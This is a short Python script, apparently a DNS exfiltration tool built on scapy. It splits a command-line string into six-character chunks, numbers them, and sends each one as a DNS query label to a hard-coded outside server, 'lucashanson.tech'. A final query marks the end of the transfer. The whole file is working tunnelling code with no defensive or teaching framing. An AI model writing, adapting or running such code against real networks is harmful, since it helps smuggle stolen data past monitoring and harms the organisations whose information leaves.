from scapy.all import *
import sys

def dns_send(query_domain, dns_server="lucashanson.tech"):
    dns_request = Ether()/IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_domain))
    answers, unanswered_packets = srp(dns_request, timeout=2, verbose=False)

to_send = str(sys.argv[2])
list = ([to_send[i:i + 6] for i in range(0, len(to_send), 6)])

count = 0
for i in list:
    # Check if the substring ends with a dot
    if i.endswith('.'):
        dns_send(str(count) + "~" + i[:-1].replace('.', '°') + "." + sys.argv[1] + "~")  # Replace dot with °
    else:
        dns_send(str(count) + "~" + i + "." + sys.argv[1] + "~")
    count = count + 1
dns_send("~~end~~." + sys.argv[1])  # Add . before ~~end~~

